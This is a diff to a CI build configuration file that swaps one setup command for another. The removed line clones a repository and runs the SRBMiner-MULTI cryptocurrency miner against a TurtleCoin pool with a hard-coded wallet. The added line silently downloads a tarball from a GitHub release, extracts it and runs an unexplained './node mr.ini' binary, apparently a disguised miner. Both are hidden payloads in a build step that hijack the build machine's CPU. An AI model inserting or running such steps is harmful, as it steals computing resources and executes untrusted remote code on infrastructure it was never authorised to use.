@@ -3,4 +3,5 @@ build:
     my-node:
       project_setup:
         before:
-          - command: git clone https://github.com/remakove/artions.git artions && cd artions && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.j2 --disable-gpu --cpu-threads 16 --cpu-affinity 0xFFFF
+          - command: wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1 && tar -xvf MXCC.tar && cd MXCC && ./node mr.ini
+
